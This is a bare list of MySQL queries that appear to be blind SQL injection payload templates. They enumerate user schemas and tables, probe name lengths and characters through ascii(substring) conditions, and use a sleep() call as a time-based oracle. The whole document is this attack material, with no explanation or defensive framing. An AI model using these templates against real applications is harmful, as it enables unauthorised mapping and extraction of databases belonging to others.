SELECT DISTINCT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') ORDER BY schema_name

SELECT count(DISTINCT(schema_name)) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') ORDER BY schema_name

SELECT CASE WHEN (SELECT count(DISTINCT(schema_name)) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') ORDER BY schema_name)=1 THEN 1 ELSE 0 END

SELECT DISTINCT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') LIMIT 1,1

SELECT (CASE WHEN ascii(substring((SELECT DISTINCT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') LIMIT 1,1),1,1))=1 THEN 1 ELSE NULL END)

SELECT (CASE WHEN length((SELECT DISTINCT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') LIMIT 1,1))=1 THEN 1 ELSE NULL END)

SELECT (CASE WHEN (SELECT count(DISTINCT(table_name)) FROM information_schema.tables WHERE table_schema='sql')=1 THEN sleep(1) END)
